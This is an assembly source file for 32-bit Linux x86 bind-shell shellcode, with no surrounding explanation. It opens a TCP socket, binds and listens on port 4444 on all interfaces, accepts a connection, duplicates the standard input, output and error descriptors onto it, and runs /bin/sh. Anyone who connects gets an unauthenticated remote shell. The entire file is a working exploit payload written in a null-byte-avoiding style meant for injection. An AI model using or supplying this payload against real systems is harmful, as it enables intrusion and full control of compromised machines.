global _start

section .text
_start:
    ; sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    xor ebx, ebx    ; Clear EBX
    mul ebx         ; Multiply EAX * 0, also clears EDX
    mov al, 0x66    ; SOCKETCALL syscall
    mov edi, eax    ; Save syscall for future use

    inc ebx         ; SYS_SOCKET (1)

    push edx        ; SYS_SOCKET arg: PROTOCOL
    push 0x1        ; SYS_SOCKET arg: SOCK_STREAM
    push 0x2        ; SYS_SOCKET arg: AF_INET
    mov ecx, esp    ; Point ECX to syscall args

    int 0x80        ; Execute syscall
    xchg esi, eax   ; Save syscall return value
    
bind:
    ; bind(sock_fd, &{sin_family, sin_port, sin_addr}, sizeof(s_addr));
    mov eax, edi    ; SOCKETCALL
    inc ebx         ; SYS_BIND (2)

    push edx        ; sin_addr = INADDR_ANY (0)
    mov cx, 0x5c11  ; sin_port
    shl ecx, 0x10   ; ECX -> 0x5C110000
    or cl, 0x2      ; ECX -> 0x5C110002
    push ecx        ; Push sockaddr struct
    mov ecx, esp    ; Move pointer to struct sockaddr into ECX
    
    push 0x10       ; sockaddr_in length: short + unsigned short + unsigned long + char[8] = 16 bytes
    push ecx        ; Pointer to new sockaddr_in struct
    push esi        ; Old socket FD
    mov ecx, esp    ; Move argument pointer to ECX

    int 0x80        ; Execute syscall

listen:
    ; listen(sock_fd, 1);
    mov eax, edi    ; SOCKETCALL
    shl ebx, 0x1    ; SYS_LISTEN (2 -> 4)

    push byte 0x1   ; Queue size
    push esi        ; sock_fd pointer
    mov ecx, esp    ; Args -> ECX

    int 0x80        ; Execute syscall

accept:
    ; bind_fd = accept(sock_fd, &{sin_family, sin_port, sin_addr}, sizeof(d_addr));
    mov eax, edi    ; SOCKETCALL
    inc ebx         ; SYS_ACCEPT (5)

    push dword edx  ; d_addr, sizeof(d_addr) = NULL
    push esi        ; sock_fd pointer
    mov ecx, esp    ; SYS_ACCEPT args -> ECX

    int 0x80        ; Execute syscall

dup:
    ; for (int i = 2; i >= 0; i--) dup2(bind_fd, i);
    xchg eax, ebx   ; SYS_ACCEPT returns new sock_fd in EAX; move to EBX
    xor ecx, ecx    ; Clear ECX

dup_loop:
    mov al, 0x3f    ; dup2 syscall
    int 0x80        ; Execute syscall
    inc ecx
    cmp cl, 0x3
    jle dup_loop

exec:
    ; execl("/bin/sh", NULL, NULL);
    push edx        ; null terminate
    push 0x68732F2F ; hs//
    push 0x6E69622F ; nib/
    mov ebx, esp    ; Load executable path into EBX
    xor eax, eax    ; Clear EAX
    mov al, 0xB     ; EXECVE syscall
    xor ecx, ecx    ; Clear ECX
    int 0x80
